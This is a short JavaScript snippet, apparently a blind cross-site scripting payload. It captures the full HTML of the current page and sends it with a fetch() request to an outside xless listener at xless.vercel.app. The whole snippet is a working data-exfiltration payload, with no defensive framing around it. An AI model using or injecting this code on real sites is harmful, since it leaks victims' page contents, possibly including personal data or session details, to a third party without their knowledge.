

// Send current page DOM to xless
const pageData = document.documentElement.outerHTML;
fetch(`https://xless.vercel.app/message?text=${encodeURIComponent(pageData)}`, {
    method: 'GET'
})
    .catch(error => {
        console.error('Error sending current page to external URL:', error);
    });
